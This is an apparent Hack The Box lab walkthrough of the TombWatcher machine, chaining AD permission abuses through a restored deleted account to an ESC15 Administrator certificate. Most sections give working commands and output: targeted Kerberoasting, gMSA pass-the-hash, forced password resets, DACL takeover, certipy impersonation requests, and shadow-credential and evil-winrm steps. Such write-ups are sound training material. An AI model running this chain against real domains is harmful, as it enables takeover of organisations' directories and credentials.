---
title: 'HTB TombWatcher: Complete Evidence-Led Walkthrough'
description: A delegated AD ACL chain led from low-privilege credentials through a restored deleted account to an ESC15 Administrator certificate.
date: 2026-11-12
category: Windows / Active Directory
difficulty: Not recorded
tags:
- Hack The Box
- Active Directory
- Kerberoasting
- gMSA
- Deleted Objects
- AD CS
- ESC15
published: true
slug: htb-tombwatcher
---

# Overview

**Machine:** TombWatcher  
**Platform:** Hack The Box  
**Publication format:** htb-tombwatcher.md  

TombWatcher began with supplied domain credentials. Instead of a network-facing exploit, the assessment established each successive privilege transition by inspecting effective Active Directory control rights.

**Documentation standard:** All meaningful stages, verification results, failed leads, command sequences, and operator notes from the uploaded source are retained below. A redacted placeholder means the method was documented but its secret value is intentionally excluded. Reported results and absent terminal evidence remain explicitly qualified.

### Engagement context from the original record

> **Hack The Box | CPTS Preparation | Windows Active Directory | Technical Walkthrough**  
> **Target:** `10.129.232.167` · **Domain:** `tombwatcher.htb` · **Host:** `DC01`  
> **Engagement:** 24–25 October 2026 (local time, Asia/Kolkata)  
> **Result:** Domain Administrator access **verified via Schannel-authenticated LDAP**; subsequent host-level completion **reported by operator**, without terminal proof retained in this chat.

**Scope / ethics.** This report documents an authorized Hack The Box training machine. The credentials, hashes, account changes, and network address pertain to that lab. Commands that modify Active Directory are included for reproducibility; do not reuse them against systems without explicit authorization.

### Executive Summary

TombWatcher began as an **assumed-breach Windows Active Directory assessment**: access was provided to the domain account `henry`, rather than requiring exploitation of an initial network-facing service. Authenticated SMB enumeration established the target as a domain controller. The readable `NETLOGON` and `SYSVOL` shares yielded no actionable files, so the investigation moved to BloodHound-based analysis of domain access-control relationships.

BloodHound exposed a continuous path from Henry through `WriteSPN`, `AddSelf`, `ReadGMSAPassword`, `ForceChangePassword`, `WriteOwner`, and `GenericAll`. The path yielded successive control of `Alfred`, the `Infrastructure` group, the `ansible_dev$` group managed service account (gMSA), `Sam`, and `John`. John had full control over the `ADCS` organizational unit (OU). Although no directly useful active child object was initially apparent, querying **Active Directory's Deleted Objects container** revealed three deleted versions of a `cert_admin` user whose `lastKnownParent` was that same OU.

The newest deleted user was restored, and its inherited permissions allowed the operator to reset its password. `cert_admin` had certificate-enrollment rights on a schema version 1 `WebServer` template. Certipy identified possible **ESC15 / CVE-2024-49019** and ESC17 conditions. A crafted ESC15 request succeeded and produced `administrator.pfx` with the domain Administrator's UPN and SID. Kerberos PKINIT authentication failed because the certificate was not valid for client authentication under that mechanism. **Schannel-backed LDAPS authentication did succeed** after a local OpenSSL compatibility adjustment, and the LDAP shell returned `u:TOMBWATCHER\Administrator`.

The operator then reported completing the remaining post-exploitation phase. The chat does **not** contain the final shadow-credential, Kerberos ticket, WinRM, flag, or cleanup output, so the strongest directly reproduced proof is Administrator-authenticated LDAP access.

#### Outcome at a glance

| Milestone | Outcome | Evidence quality |
|---|---|---|
| Authenticate as Henry | Successful | Direct SMB transcript |
| Identify full AD delegation chain | Successful | BloodHound screenshot |
| Recover Alfred password | `[REDACTED]` | Operator-reported crack, corroborated by subsequent authenticated membership change |
| Join Infrastructure | Successful | `bloodyAD get membership Alfred` |
| Read `ansible_dev$` managed secret | Successful | `nxc ldap --gmsa` output |
| Reset Sam password | Successful | SMB login as Sam |
| Take ownership and control of John | Successful | `bloodyAD` modification outputs and SMB login |
| Find and restore `cert_admin` | Successful | Deleted-object LDAP data and restored object's GUID/SID |
| Obtain Administrator-identity certificate | Successful | Certipy request ID **4**, PFX saved |
| Authenticate as Domain Administrator via LDAPS | **Successful** | Certipy LDAP-shell authentication and `whoami` |
| Obtain Administrator NT hash / host shell / flags | Operator reports completion | Final commands were proposed; resulting outputs not supplied |

## Enumeration

This section documents the initial conditions, observable services, reachable applications and evidence that informed the next action.

### Starting Conditions & Initial Credentials

The engagement supplied an authorized foothold identity:

```text
Target IP : 10.129.232.167
Hostname  : DC01
Domain    : tombwatcher.htb
Username  : henry
Password  : [REDACTED]
OS        : Windows Server 2019 / build 17763 (identified by SMB)
```

A working directory was used to retain scan output and evidence:

```bash
mkdir -p <REDACTED>
cd ~/TombWatcher
```

The first Nmap attempt failed because the `scans/` directory did not yet exist:

```text
Failed to open normal output file scans/full.nmap for writing:
No such file or directory (2)
```

Creating the directory resolved this operational issue. The domain was also added to `/etc/hosts` to simplify tool resolution:

```bash
echo '10.129.232.167 tombwatcher.htb DC01.tombwatcher.htb' \
  | sudo tee -a /etc/hosts
```

### Network Reconnaissance

#### Full TCP port scan

```bash
sudo nmap -Pn -sS -p- --min-rate 2000 \
  --open -oA scans/full 10.129.232.167
```

Nmap reported the host up with approximately 0.32 s latency and **21 open TCP ports**. Most other ports were reported filtered. Relevant results:

| TCP port | Service | Pentest relevance |
|---:|---|---|
| 53 | DNS | Domain name resolution |
| 80 | HTTP | Web endpoint observed; not developed into an attack in this engagement |
| 88 | Kerberos | AD authentication and ticket requests |
| 135 | MSRPC | Windows RPC endpoint mapper |
| 139 | NetBIOS | Legacy SMB name/session services |
| 389 | LDAP | Directory enumeration and manipulation |
| 445 | SMB | Credential validation, domain shares |
| 464 | kpasswd | Kerberos password-change service |
| 593 | RPC over HTTP | Additional Windows RPC endpoint |
| 636 | LDAPS | Critical for final Schannel authentication |
| 3268 / 3269 | Global Catalog / TLS | AD forest catalog |
| 5985 | WinRM | Potential Windows management access |
| 9389 | AD Web Services | Additional AD management surface |
| 49666, 49695–49697, 49716, 49722, 49741 | Dynamic RPC | High Windows RPC ports |

The presence of Kerberos, LDAP, Global Catalog, SMB, and AD Web Services strongly indicated a domain controller, later confirmed by SMB. A version/script scan was recommended but its output is not preserved in the record.

#### Validating the supplied account

```bash
nxc smb 10.129.232.167 \
  -u henry -p '<REDACTED>' --shares
```

Representative evidence:

```text
SMB 10.129.232.167 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64
    (name:DC01) (domain:tombwatcher.htb) (signing:True)
    (SMBv1:None) (Null Auth:True)
SMB 10.129.232.167 445 DC01 [+] tombwatcher.htb\henry:[REDACTED]

ADMIN$       (no access shown)
C$           (no access shown)
IPC$         READ
NETLOGON     READ
SYSVOL       READ
```

**Interpretation.** Henry was a valid domain user. SMB signing was enabled, SMBv1 was unavailable, and default administrator shares were not reported readable. The `Null Auth: True` banner was observed, but no anonymous-share compromise was demonstrated; it should not be interpreted as successful anonymous file access.

`NETLOGON` and `SYSVOL` were inspected over SMB and did **not** contain actionable files in this engagement. These shares should still be checked early in similar assessments because login scripts, Group Policy Preferences, and configuration files sometimes leak secrets.

#### Domain user enumeration

```bash
nxc smb 10.129.232.167 \
  -u henry -p '<REDACTED>' --users
```

Seven accounts appeared:

| Account | Observed category |
|---|---|
| Administrator | Built-in domain administrator |
| Guest | Built-in guest |
| krbtgt | Kerberos service account |
| Henry | Supplied starting user |
| Alfred | User later controlled by targeted Kerberoasting |
| sam | User later controlled by password reset |
| john | User later controlled by ACL abuse |

The query returned password-change timestamps, but no credentials beyond Henry's starting password. The list provided a useful cross-check for names seen in BloodHound.

## Analysis

WriteSPN enabled targeted Kerberoasting, AddSelf enabled group membership, and ReadGMSAPassword enabled another authentication context. The subsequent password-reset and ownership transitions exposed John's control over the ADCS OU. Three deleted cert_admin objects had their lastKnownParent in that OU; restoring the newest returned inherited object control. A WebServer ESC15 request yielded an Administrator certificate that worked over Schannel LDAP despite failed PKINIT.

### BloodHound: The Complete Permission Chain

Data collection was carried out against the `tombwatcher.htb` domain. The documented collection syntax was:

```bash
bloodhound-python \
  -u henry -p '<REDACTED>' \
  -d tombwatcher.htb \
  -dc DC01.tombwatcher.htb \
  -ns 10.129.232.167 \
  -c All --zip
```

> The collection command was recommended in the session; the **resulting BloodHound graph** is preserved, but the collector's stdout is not.

**BloodHound screenshot:** Included in the companion ZIP package. The full permission chain is also reproduced as text below, so this Markdown file remains readable by itself.

*Figure 1 - BloodHound pathfinding graph captured during the engagement. The graphic ends at the ADCS OU; the subsequent deleted-object recovery and AD CS exploitation were discovered through further enumeration.*

The key edges were:

```text
HENRY
  └─ WriteSPN ───────────────► ALFRED
        └─ AddSelf ──────────► INFRASTRUCTURE (group)
              └─ ReadGMSAPassword ─► ANSIBLE_DEV$ (gMSA)
                    └─ ForceChangePassword ─► SAM
                          └─ WriteOwner ─► JOHN
                                └─ GenericAll ─► OU=ADCS
                                      └─ deleted cert_admin object
                                            └─ restored cert_admin
                                                  └─ WebServer V1 / ESC15
                                                        └─ Schannel as Administrator
```

**Why this mattered.** None of the early identities was inherently a domain administrator. Instead, individually scoped delegation permissions could be combined to expand control from one AD object to another. The graph suggested a feasible path, but every edge was still checked in the live directory.

## Validation

The following is the full technical sequence retained from the uploaded write-up, including commands, outputs, dead ends, corrected tests and the limits of available proof. Section order within this part follows the original investigation.

### Henry → Alfred: WriteSPN / Targeted Kerberoasting

#### Vulnerability and approach

BloodHound showed that Henry possessed `WriteSPN` over Alfred. That permission allows editing Alfred's `servicePrincipalName` property. A targeted Kerberoasting workflow temporarily assigns a service principal name, requests a Kerberos service ticket whose encrypted component is tied to Alfred's account password, and saves an offline-crackable TGS representation. This is different from indiscriminately requesting tickets for pre-existing SPNs.

The operator reused the targetedKerberoast project installed under `~/AdminBox/targetedKerberoast`:

```bash
cd ~/AdminBox/targetedKerberoast

.venv/bin/python targetedKerberoast.py \
  -d tombwatcher.htb \
  -u henry -p '<REDACTED>' \
  --dc-ip 10.129.232.167 \
  --request-user Alfred \
  -o ~/TombWatcher/alfred.tgs
```

The first attempt to execute `.venv/bin/python` from `~/TombWatcher` returned a **file-not-found** error. The virtual environment existed in the older `~/AdminBox/targetedKerberoast` installation, not in the newly created TombWatcher directory. Changing to the correct directory fixed that issue.

#### Kerberos clock skew: repeated failures and correct diagnosis

The first request then failed:

```text
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

A previously useful offset of `+7h` did not work, nor did `+10h`. Rather than continue guessing, the operator queried the DC's SMB-reported time:

```bash
sudo nmap -Pn -p445 --script smb2-time 10.129.232.167
```

```text
| smb2-time:
|   date: 2026-10-24T22:47:56
|_  start_date: N/A
```

Parrot's UTC time was reported as:

```text
2026-10-24 18:48:55 UTC
```

Thus, the domain controller was **about four hours ahead** of the attacking machine. A first automated parsing command made a subtle mistake:

```bash
DC_TIME=$(sudo nmap -Pn -p445 --script smb2-time 10.129.232.167 \
  | awk '/date:/ {print $3}')
```

The pattern matched both `date:` **and** `start_date:`, concatenating `N/A` into the value. `date -d` failed and a nonsense negative offset was calculated. The corrected parser matches the whole field:

```bash
DC_TIME=$(sudo nmap -Pn -p445 --script smb2-time 10.129.232.167 \
  | awk '$2 == "date:" {print $3; exit}')

OFFSET=$(( $(date -u -d "$DC_TIME" +%s) - $(date -u +%s) ))
printf 'DC offset: %+d seconds\n' "$OFFSET"
```

The measured offset was approximately `+14400` seconds. The operator did not need to change the system clock; applying a per-process `faketime` offset was sufficient:

```bash
faketime -f '+4h' .venv/bin/python targetedKerberoast.py \
  -d tombwatcher.htb \
  -u henry -p '<REDACTED>' \
  --dc-ip 10.129.232.167 \
  --request-user Alfred \
  -o ~/TombWatcher/alfred.tgs
```

```text
[*] Starting kerberoast attacks
[*] Attacking user (Alfred)
[+] Writing hash to file for (Alfred)
```

**Result:** Alfred's service ticket hash was successfully collected. The specific TGS encryption type was not preserved in the session transcript; the correct Hashcat mode must be selected from the saved hash prefix (for example, `$krb5tgs$23$` uses mode `13100`). The operator reported cracking Alfred's password as:

```text
Alfred / [REDACTED]
```

> **Artifact hygiene:** Verify the temporary SPN has been removed. The transcript does not include an SPN-readback or cleanup confirmation.

### Alfred → Infrastructure: AddSelf

The next BloodHound edge showed `AddSelf` from Alfred to the `Infrastructure` security group. This permits the principal to add **itself** to the group; it is not equivalent to unrestricted group administration.

The session's proposed command was:

```bash
bloodyAD --host 10.129.232.167 \
  -d tombwatcher.htb \
  -u Alfred -p '<REDACTED>' \
  add groupMember Infrastructure Alfred
```

The exact add-command output was not retained. The resulting membership was directly verified:

```bash
bloodyAD --host 10.129.232.167 \
  -d tombwatcher.htb \
  -u Alfred -p '<REDACTED>' \
  get membership Alfred
```

```text
sAMAccountName: Users
sAMAccountName: Domain Users
sAMAccountName: Infrastructure
```

**Result:** Alfred belonged to `Infrastructure` and inherited the group's delegated access to the managed service-account password.

### Infrastructure → ansible_dev$: gMSA Password Retrieval

A **group Managed Service Account (gMSA)** has a long, automatically managed secret controlled by Active Directory. AD's `PrincipalsAllowedToReadPassword` relationship governs which principals can retrieve the managed secret. The `Infrastructure` group had precisely this right over `ansible_dev$`.

With Alfred's new group membership, NetExec successfully read the gMSA material:

```bash
nxc ldap 10.129.232.167 \
  -d tombwatcher.htb \
  -u Alfred -p '<REDACTED>' \
  --gmsa
```

```text
[+] tombwatcher.htb\Alfred:[REDACTED]
[*] Getting GMSA Passwords
Account: ansible_dev$
NTLM: [REDACTED_HEX]
PrincipalsAllowedToReadPassword: Infrastructure
```

This was a direct, high-confidence demonstration of the `ReadGMSAPassword` relationship. Because Windows NTLM authentication accepts an NT hash directly, the hash could be used for pass-the-hash without cracking a plaintext gMSA password:

```bash
nxc smb 10.129.232.167 \
  -d tombwatcher.htb \
  -u 'ansible_dev$' \
  -H '[REDACTED_HEX]'
```

> The SMB validation command was recommended; its actual output was not preserved. Successful password modification in the following stage supports the practical usability of the gMSA credentials.

### ansible_dev$ → Sam: ForceChangePassword

BloodHound showed that `ansible_dev$` had `ForceChangePassword` over `Sam`. This delegated control permits resetting Sam's password without knowing the previous password. It is intrusive: it changes the target's credentials rather than silently impersonating the account.

The documented procedure used bloodyAD's NT-hash authentication format (a colon prefixed to the NT hash):

```bash
bloodyAD --host 10.129.232.167 \
  -d tombwatcher.htb \
  -u 'ansible_dev$' \
  -p '<REDACTED>' \
  set password sam '[REDACTED]'
```

The command's stdout was not supplied, but its result was verified with SMB:

```bash
nxc smb 10.129.232.167 \
  -d tombwatcher.htb \
  -u sam -p '<REDACTED>'
```

```text
[+] tombwatcher.htb\sam:[REDACTED]
```

**Result:** Control of Sam confirmed. Record the password reset as an AD-changing action and expect pre-existing sessions or services using the old password potentially to be affected in real environments.

### Sam → John: WriteOwner, DACL Modification and Password Reset

#### Taking ownership

Sam possessed `WriteOwner` over John's user object. This lets Sam replace the object's security descriptor owner with Sam, which in turn permits changing the object's discretionary ACL under the relevant AD security rules.

```bash
bloodyAD --host 10.129.232.167 \
  -d tombwatcher.htb \
  -u sam -p '<REDACTED>' \
  set owner John sam
```

The tool confirmed the previous owner and change:

```text
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512
    is now replaced by sam on John
```

The old SID ends in `-512`, identifying the **Domain Admins** group. That original owner value is important cleanup evidence.

#### Tooling hiccup: missing `impacket-dacledit`

A DACL backup with `impacket-dacledit -action backup` was attempted, but the Parrot environment returned:

```text
bash: impacket-dacledit: command not found
```

Rather than blocking on the missing command, the operator used bloodyAD to modify the ACL. This solved the lab but meant there was **no pre-change DACL backup confirmed in the record** - a material difference from ideal engagement hygiene.

#### Granting GenericAll and resetting the password

```bash
bloodyAD --host 10.129.232.167 \
  -d tombwatcher.htb \
  -u sam -p '<REDACTED>' \
  add genericAll John sam
```

```text
[+] sam has now GenericAll on John
```

Then:

```bash
bloodyAD --host 10.129.232.167 \
  -d tombwatcher.htb \
  -u sam -p '<REDACTED>' \
  set password John '[REDACTED]'
```

```text
[+] Password changed successfully!
```

Authentication was independently verified:

```bash
nxc smb 10.129.232.167 \
  -d tombwatcher.htb \
  -u John -p '<REDACTED>'
```

```text
[+] tombwatcher.htb\John:[REDACTED]
```

**Result:** John's account was controlled. Note that `GenericAll` is broader than a narrowly scoped password-reset ACE; it enabled the operation but expanded the persistent delegation footprint.

### John → ADCS OU: Inherited Full Control

BloodHound's final initially visible edge was `GenericAll` from John to the organizational unit:

```text
OU=ADCS,DC=tombwatcher,DC=htb
```

The operator queried its security descriptor:

```bash
bloodyAD --host 10.129.232.167 \
  -d tombwatcher.htb \
  -u John -p '<REDACTED>' \
  get object 'OU=ADCS,DC=tombwatcher,DC=htb' \
  --resolve-sd
```

Critical ACE:

```text
nTSecurityDescriptor.ACL.4.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.4.Trustee: john
nTSecurityDescriptor.ACL.4.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.4.ObjectType: Self
nTSecurityDescriptor.ACL.4.Flags: CONTAINER_INHERIT
```

The OU itself was owned by Domain Admins, yet John had an explicit `GenericAll` access-control entry. The `CONTAINER_INHERIT` flag made inherited control of descendant objects plausible; the effective access still depended on the child object and applicable ACEs.

At first, no useful ordinary active object was identified. The machine's name suggested checking whether formerly contained objects had been deleted. This was treated as a **hypothesis**, then tested through LDAP rather than assuming the name revealed a solution.

### Deleted Objects Enumeration: Three cert_admin Tombstones

The operator queried AD's Deleted Objects container using LDAP's Show Deleted control (`1.2.840.113556.1.4.417`):

```bash
ldapsearch -x \
  -H ldap://10.129.232.167 \
  -D 'John@tombwatcher.htb' -W \
  -b 'CN=Deleted Objects,DC=tombwatcher,DC=htb' \
  -e '1.2.840.113556.1.4.417' \
  '(isDeleted=TRUE)' \
  distinguishedName cn lastKnownParent \
  sAMAccountName objectClass isDeleted
```

The response contained the Deleted Objects container and **three different deleted user objects**, all named `cert_admin` and all formerly beneath the ADCS OU:

```text
sAMAccountName: cert_admin
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
isDeleted: TRUE
```

The records were distinguished by unique deletion-marker GUIDs. A second query exposed their creation times, SIDs, and user flags:

```bash
ldapsearch -LLL -o ldif-wrap=no -x \
  -H ldap://10.129.232.167 \
  -D 'John@tombwatcher.htb' -W \
  -b 'CN=Deleted Objects,DC=tombwatcher,DC=htb' \
  -e '1.2.840.113556.1.4.417' \
  '(&(isDeleted=TRUE)(sAMAccountName=cert_admin))' \
  distinguishedName objectSid whenCreated whenChanged \
  isRecycled lastKnownParent msDS-LastKnownRDN \
  userAccountControl memberOf
```

| Deleted object marker | Created (UTC) | Changed (UTC) | RID | `userAccountControl` |
|---|---|---|---:|---:|
| `f80369c8-96a2-4a7f-a56c-9c15edd7d1e3` | 2024-11-16 00:55:59 | 00:57:59 | 1109 | 66048 |
| `c1f1f0fe-df9c-494c-bf05-0679e181b358` | 2024-11-16 17:04:05 | 17:04:21 | 1110 | 66048 |
| `938182c3-bf0b-410a-9aaa-45c8e1a02ebf` | 2024-11-16 17:07:04 | 17:07:27 | 1111 | 66048 |

The complete domain SID base was:

```text
S-1-5-21-1392491010-1358638721-2126982587
```

`66048` corresponds to a normal account with a non-expiring password. The missing `isRecycled` field was **not** interpreted as proof of a particular recycling status. Likewise, three deleted accounts with the same `sAMAccountName` were not treated as one identity; each had a different object GUID and SID.

#### Why deleted-object enumeration mattered

An ordinary LDAP search sees active objects by default. The deleted-object query exposed historical user objects and their original parent. The common `lastKnownParent` connected them directly to the OU John controlled, converting an apparently uninteresting OU delegation into a credible access-expansion opportunity.

### Restore the Newest cert_admin and Inherit the OU ACL

The operator selected the most recently created `cert_admin` (RID **1111**). This selection was an exploratory choice, **not proof** that newer objects are always more privileged.

The documented restoration command was:

```bash
bloodyAD --host 10.129.232.167 \
  -d tombwatcher.htb \
  -u John -p '<REDACTED>' \
  set restore \
  'CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb'
```

> The restore-command stdout is not in the transcript. Its **successful result** is established by the following live object read, which returned the exact GUID and RID in the expected OU.

```bash
bloodyAD --host 10.129.232.167 \
  -d tombwatcher.htb \
  -u John -p '<REDACTED>' \
  get object cert_admin
```

```text
distinguishedName: CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
objectGUID: 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid: S-1-5-21-1392491010-1358638721-2126982587-1111
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
whenChanged: 2026-10-24 23:11:56+00:00
```

An inherited full-control ACE in the restored user's security descriptor was especially important:

```text
(A;CIID;0xf01ff;;;S-1-5-21-1392491010-1358638721-2126982587-1106)
```

The `0xf01ff` mask is full control and the ACE was marked inherited. This supports the chain from delegated OU control to control of the recovered user object. AD object restoration may involve additional directory rights beyond the OU ACE; the exercise demonstrates effective success in this environment rather than proving that OU `GenericAll` alone always grants universal tombstone restoration.

With the restored object controllable, the operator reset its password to `[REDACTED]`. The later successful bloodyAD and Certipy authentications corroborate possession of those credentials.

#### Membership verification

```bash
bloodyAD --host 10.129.232.167 \
  -d tombwatcher.htb \
  -u cert_admin -p '<REDACTED>' \
  get membership cert_admin
```

```text
sAMAccountName: Users
sAMAccountName: Domain Users
```

There was **no evidence of Domain Admin group membership**. The value of `cert_admin` lay elsewhere: explicit access to an AD CS certificate template.

### AD CS Enumeration: WebServer / ESC15

The operator enumerated Certificate Services using Certipy v5.1.0:

```bash
certipy-ad find \
  -u 'cert_admin@tombwatcher.htb' \
  -p '<REDACTED>' \
  -dc-ip 10.129.232.167 \
  -vulnerable -stdout
```

Selected output:

```text
[*] Found 33 certificate templates
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Found 13 issuance policies
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
```

The CA was hosted on `DC01.tombwatcher.htb`. Certipy initially failed to open Remote Registry but subsequently retrieved the CA configuration. HTTP/HTTPS web enrollment were reported disabled; certificate requests remained possible through RPC.

#### CA and template facts

| Property | Observed value |
|---|---|
| CA | `tombwatcher-CA-1` |
| CA hostname | `DC01.tombwatcher.htb` |
| Web enrollment | Disabled (HTTP and HTTPS) |
| CA-wide user-supplied SAN | Disabled |
| Template | `WebServer` (Web Server) |
| Template enabled | Yes |
| Template schema | **Version 1** |
| Template subject | **Enrollee supplies subject** |
| Standard EKU | **TLS Web Server Authentication** |
| Standard Client Authentication EKU | No |
| Manager approval | Not required |
| Authorized signatures | 0 |
| CA issuance disposition | Issue |
| `cert_admin` enrollment | **Explicitly permitted** |
| Certipy findings | **ESC15** and **ESC17**, with prerequisites/caveats |

CA administrative rights (`ManageCA` and `ManageCertificates`) belonged to administrator groups, not to `cert_admin`. That distinction is crucial: the successful attack did not require making `cert_admin` a CA administrator.

#### Why ESC15 was plausible

ESC15, associated with **CVE-2024-49019**, concerns application-policy injection in certificates issued from legacy schema version 1 templates by vulnerable/unpatched certification authorities. Here, the `WebServer` template accepted enrollee-supplied subjects, did not require approval or authorized signatures, and could be enrolled by `cert_admin`. Although its **standard EKU** was restricted to Server Authentication, an injected **Client Authentication application policy** could potentially permit a Schannel authentication path inconsistent with the template's intended use.

Certipy also flagged **ESC17**. That was a separate *configuration-based warning*, not a second exploited weakness. The verified attack in this case followed the **ESC15** application-policy path.

### Request an Administrator-Identity Certificate

The operator requested a new certificate through RPC using the restored account. The Administrator RID is `500`, so its SID was derived from the observed domain SID:

```text
S-1-5-21-1392491010-1358638721-2126982587-500
```

Command:

```bash
cd ~/TombWatcher

certipy-ad req \
  -u 'cert_admin@tombwatcher.htb' \
  -p '<REDACTED>' \
  -dc-ip 10.129.232.167 \
  -target 'DC01.tombwatcher.htb' \
  -ca 'tombwatcher-CA-1' \
  -template 'WebServer' \
  -upn 'administrator@tombwatcher.htb' \
  -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' \
  -application-policies 'Client Authentication'
```

Direct evidence:

```text
[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

**Result:** The CA issued a certificate containing the target Administrator identity. This demonstrated that the vulnerable certificate issuance pathway accepted the crafted request. At this point, however, **issuance was not yet equivalent to authentication**.

### Authentication Troubleshooting: PKINIT Failure and Schannel Success

This stage produced two technically important obstacles that could have been mistaken for a failed ESC15 exploitation.

#### Direct PKINIT failed

The operator first tried ordinary certificate-based Kerberos authentication, applying the previously established `+4h` clock offset:

```bash
faketime -f '+4h' certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain tombwatcher.htb \
  -dc-ip 10.129.232.167
```

Certipy reported the Administrator UPN and SID, then rejected the certificate for this authentication mechanism:

```text
[*] Trying to get TGT...
[-] Certificate is not valid for client authentication
[-] Check the certificate template and ensure it has the correct EKU(s)
```

The certificate's ordinary EKU was still Server Authentication. Application-policy injection did **not** necessarily make it acceptable to Certipy's PKINIT path. The error was not a repeat of the earlier Kerberos clock-skew issue.

#### Schannel was the appropriate alternative

The operator retried the issued certificate against LDAPS, asking Certipy to create an LDAP shell:

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -dc-ip 10.129.232.167 \
  -ldap-shell
```

However, this first TLS connection failed *locally*:

```text
[SSL: CA_MD_TOO_WEAK] ca md too weak
```

A certificate inspection using OpenSSL revealed a weak signature algorithm:

```bash
openssl pkcs12 -in administrator.pfx \
  -clcerts -nokeys -passin pass: \
  | openssl x509 -noout -text \
  | grep -A 12 -E \
    'Extended Key Usage|Application Policies|1\.3\.6\.1\.4\.1\.311\.21\.10'
```

Relevant lines:

```text
Microsoft Application Policies Extension:
    0.0
X509v3 Extended Key Usage:
    TLS Web Server Authentication
Signature Algorithm: sha1WithRSAEncryption
```

The `0.0` rendering reflected OpenSSL's limited human-readable decoding of the Microsoft-specific application-policy extension; it was **not** proof that no useful policy was embedded. The `sha1WithRSAEncryption` algorithm explained why local OpenSSL policy might reject the certificate chain.

#### Per-process OpenSSL compatibility configuration

Instead of weakening the host's system-wide cryptographic policy, the operator created a **lab-local** configuration:

```bash
cat > openssl_legacy.cnf <<'EOF_OPENSSL'
openssl_conf = openssl_init

[openssl_init]
ssl_conf = ssl_sect

[ssl_sect]
system_default = system_default_sect

[system_default_sect]
CipherString = DEFAULT:@SECLEVEL=0
EOF_OPENSSL
```

This set OpenSSL security level **0 only for the process started with the environment variable**. It was a compatibility workaround for a legacy training environment, **not a secure default for production systems**.

With that environment applied, the operator reran Schannel-backed LDAP authentication:

```bash
OPENSSL_CONF="$PWD/openssl_legacy.cnf" \
certipy-ad auth \
  -pfx administrator.pfx \
  -dc-ip 10.129.232.167 \
  -ldap-shell
```

The decisive output was:

```text
[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*]     SAN URL SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Connecting to 'ldaps://10.129.232.167:636'
[*] Authenticated to '10.129.232.167' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# whoami
u:TOMBWATCHER\Administrator
```

**Verified impact:** The issued certificate was accepted for **Administrator-authenticated LDAPS through Schannel**. That proved privileged directory authentication and, in context, the successful exploitation of the identified ESC15 path. It did **not**, by itself, show a Kerberos TGT, an NT hash, an SMB admin session, or a SYSTEM process token.

### Final Post-Exploitation: Shadow Credentials and Host Access

Once inside an Administrator-authenticated LDAP shell, the discussed follow-on path was to use **shadow credentials** on Administrator's account, obtaining a fresh certificate associated with `msDS-KeyCredentialLink`, then authenticating via PKINIT. That approach avoids reliance on the Server Authentication-only `WebServer` certificate for Kerberos authentication.

The workflow discussed in the session was:

```text
# backup_shadow_creds administrator
# set_shadow_creds administrator
```

The first command backs up existing key credentials to a JSON file; the second modifies the target account's key credentials and produces new certificate material. Record the filename and PFX password emitted by the tool rather than inventing them.

Then, from Parrot, the proposed command was:

```bash
faketime -f '+4h' certipy-ad auth \
  -pfx <NEW_SHADOW_CERTIFICATE.pfx> \
  -password '<PFX_PASSWORD_FROM_TOOL>' \
  -username administrator \
  -domain tombwatcher.htb \
  -dc-ip 10.129.232.167
```

And after retrieving an NT hash, an interactive WinRM attempt was proposed:

```bash
evil-winrm -i 10.129.232.167 \
  -u Administrator \
  -H '<RECOVERED_ADMINISTRATOR_NT_HASH>'
```

The operator subsequently stated **“done”**, indicating completion of the remaining work. **The actual output from `set_shadow_creds`, PKINIT, NT-hash retrieval, WinRM, flag collection, and key-credential restoration was not shared**, so none of those artifacts or exact results is manufactured in this report.

For reproducible proof in a final engagement report, preserve the actual `whoami`, `hostname`, privilege context, flag paths/proofs if in scope, and cleanup commands/output. If shadow credentials were changed, restore the original backed-up values with the LDAP shell's `restore_shadow_creds administrator <backupfile>` facility and verify the attribute afterward.

### Cleanup and Artifact Inventory

#### Directory changes to review / revert after authorized testing

- **Alfred / Infrastructure:** verify and remove the added group membership if the original membership did not include Alfred.
- **Alfred SPN:** inspect whether targetedKerberoast reverted the temporary SPN; remove only the newly added test value if it remains.
- **Sam and John passwords:** document deliberate resets. Without the original passwords, full restoration may require a coordinated administrator reset; do not pretend the old passwords are recoverable from the record.
- **John owner and DACL:** remove Sam's new `GenericAll` ACE; restore the original owner (Domain Admins, RID 512) using a suitably privileged context. The original entire DACL was not backed up in the transcript.
- **Restored cert_admin:** preserve GUID/RID and coordinate disposition of the recovered identity. Don't blindly delete objects during cleanup because the original deleted state may be intentional lab setup.
- **AD CS request 4:** inventory the issued Administrator-identity certificate and revoke it if certificate-management rights and lab instructions permit.
- **Administrator key credentials:** if shadow credentials were added, restore the backup rather than clearing the entire attribute.
- **Local OpenSSL setting:** keep `openssl_legacy.cnf` limited to the test invocation; never apply `SECLEVEL=0` globally.

#### Evidence artifacts

| Artifact | Purpose / location |
|---|---|
| `scans/full.nmap`, `.gnmap`, `.xml` | Full-port discovery; generated on Parrot |
| `alfred.tgs` | Offline TGS artifact; generated on Parrot |
| `administrator.pfx` | Issued Administrator-identity certificate and private key; **sensitive** |
| `openssl_legacy.cnf` | Local TLS compatibility configuration |
